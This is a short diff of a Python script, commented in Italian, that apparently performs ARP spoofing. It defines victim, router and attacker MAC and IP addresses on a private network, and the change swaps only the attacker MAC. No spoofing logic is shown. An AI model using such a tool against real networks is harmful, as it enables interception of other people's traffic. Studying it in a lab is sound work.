@@ -75,7 +75,7 @@ if __name__ == "__main__":
     vittima_mac = "00:0c:29:75:0f:42"  # MAC della vittima
     router_ip = "192.168.186.2"  # IP del router
     router_mac = "00:50:56:e4:df:4c"  # MAC del router (corretto lo spazio in eccesso)
-    attaccante_mac = "00:0c:29:dc:d2:c0"  # MAC dell'attaccante (il nostro MAC)
+    attaccante_mac = "00:0c:29:92:8a:6a"  # MAC dell'attaccante (il nostro MAC)
     
     try:
         # Loop infinito fino a quando non si preme Ctrl+C
